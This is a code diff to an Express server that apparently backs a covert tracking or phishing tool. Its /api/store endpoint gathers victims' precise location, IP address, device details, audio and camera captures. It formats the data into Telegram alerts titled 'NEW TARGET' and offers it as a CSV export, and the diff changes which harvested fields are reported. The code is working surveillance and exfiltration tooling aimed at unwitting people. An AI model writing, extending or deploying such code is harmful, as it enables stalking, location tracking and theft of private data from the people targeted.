@@ -113,65 +113,62 @@ app.post('/api/store', async (req, res) => {
         console.log('✅ Stored! Total:', allData.length);
 
         // ==========================================
-        // TELEGRAM CAPTION - SIRF REAL HARDWARE DATA!
+        // TELEGRAM CAPTION - SIRF REAL DATA!
         // ==========================================
         const device = fullDeviceInfo || deviceDetails || {};
         const loc = location || {};
         const speed = networkSpeed || {};
 
         let captionLines = [];
-        captionLines.push('🔴 <b>NEW TARGET ACQUIRED</b> 🔴');
+        captionLines.push('🔴 <b>NEW TARGET</b> 🔴');
 
-        // 1. LOCATION
+        // LOCATION
         if (loc.lat && loc.lng) {
             captionLines.push(`📍 Location: ${loc.lat}, ${loc.lng}`);
         }
-
-        // 2. DEVICE - REAL MANUFACTURER + MODEL
-        let deviceDisplay = '';
-        if (device.manufacturer && device.manufacturer !== 'Unknown' && device.manufacturer !== '—') {
-            deviceDisplay = device.manufacturer;
-        }
-        if (device.model && device.model !== 'Unknown' && device.model !== '—' && !device.model.includes('Unknown')) {
-            deviceDisplay += ' ' + device.model;
-        }
-        if (device.deviceModel && device.deviceModel !== 'Unknown' && device.deviceModel !== '—' && !device.deviceModel.includes('Unknown')) {
-            deviceDisplay += ' ' + device.deviceModel;
-        }
-        if (deviceDisplay.trim() && deviceDisplay !== 'Unknown' && deviceDisplay !== '—') {
-            captionLines.push(`📱 Device: ${deviceDisplay.trim()}`);
+        if (loc.accuracy) {
+            captionLines.push(`🎯 Accuracy: ${loc.accuracy}m`);
         }
 
-        // 3. OS - REAL OS
-        if (device.os && device.os !== 'Unknown' && device.os !== '—') {
-            let osStr = device.os;
-            if (device.osVersion && device.osVersion !== 'Unknown' && device.osVersion !== '—') {
-                osStr += ' ' + device.osVersion;
-            }
-            captionLines.push(`📲 OS: ${osStr}`);
-        }
-
-        // 4. IP
-        if (ipAddress && ipAddress !== 'Unknown' && ipAddress !== '—') {
+        // IP
+        if (ipAddress && ipAddress !== '—' && ipAddress !== 'Unknown') {
             captionLines.push(`📡 IP: ${ipAddress}`);
         }
 
-        // 5. Network
-        if (device.connection?.type && device.connection.type !== 'Unknown' && device.connection.type !== '—') {
+        // BATTERY
+        if (device.battery && device.battery !== '—' && device.battery !== 'Unknown') {
+            captionLines.push(`🔋 Battery: ${device.battery}`);
+        }
+
+        // NETWORK
+        if (device.network && device.network !== '—' && device.network !== 'Unknown') {
+            captionLines.push(`📶 Network: ${device.network}`);
+        }
+        if (device.connection?.type && device.connection.type !== '—' && device.connection.type !== 'Unknown') {
             captionLines.push(`📶 Network: ${device.connection.type}`);
         }
 
-        // 6. Speed
-        if (speed.download && speed.download !== 'Unknown' && speed.download !== '—') {
+        // SCREEN
+        if (device.screen && device.screen !== '—' && device.screen !== 'Unknown') {
+            captionLines.push(`🖥️ Screen: ${device.screen}`);
+        }
+
+        // LANGUAGE
+        if (device.language && device.language !== '—' && device.language !== 'Unknown') {
+            captionLines.push(`🌐 Language: ${device.language}`);
+        }
+
+        // TIMEZONE
+        if (device.timezone && device.timezone !== '—' && device.timezone !== 'Unknown') {
+            captionLines.push(`🕒 Timezone: ${device.timezone}`);
+        }
+
+        // SPEED
+        if (speed.download && speed.download !== '—' && speed.download !== 'Unknown') {
             captionLines.push(`🚀 Speed: ${speed.download} Mbps`);
         }
 
-        // 7. Battery
-        if (device.battery?.level && device.battery.level !== 'Unknown' && device.battery.level !== '—') {
-            captionLines.push(`🔋 Battery: ${device.battery.level}`);
-        }
-
-        // 8. Always show
+        // CAPTURES & TIME
         captionLines.push(`📸 Captures: ${captureCount || 1}`);
         captionLines.push(`🕐 Time: ${new Date().toISOString()}`);
 
@@ -202,7 +199,7 @@ app.get('/api/get-ip', (req, res) => {
 
 app.get('/api/export-csv', (req, res) => {
     try {
-        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
+        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Battery,Network,Screen,Language,Timezone,Audio,Captures\n';
         allData.forEach(item => {
             const device = item.fullDeviceInfo || item.deviceDetails || {};
             const row = [
@@ -211,10 +208,11 @@ app.get('/api/export-csv', (req, res) => {
                 item.location?.lat || '—',
                 item.location?.lng || '—',
                 item.ipAddress || '—',
-                device.deviceName || '—',
-                device.deviceModel || '—',
-                device.connection?.type || '—',
-                item.networkSpeed?.download || '—',
+                device.battery || '—',
+                device.network || device.connection?.type || '—',
+                device.screen || '—',
+                device.language || '—',
+                device.timezone || '—',
                 item.audioData ? 'Yes' : 'No',
                 item.captureCount || 1
             ];
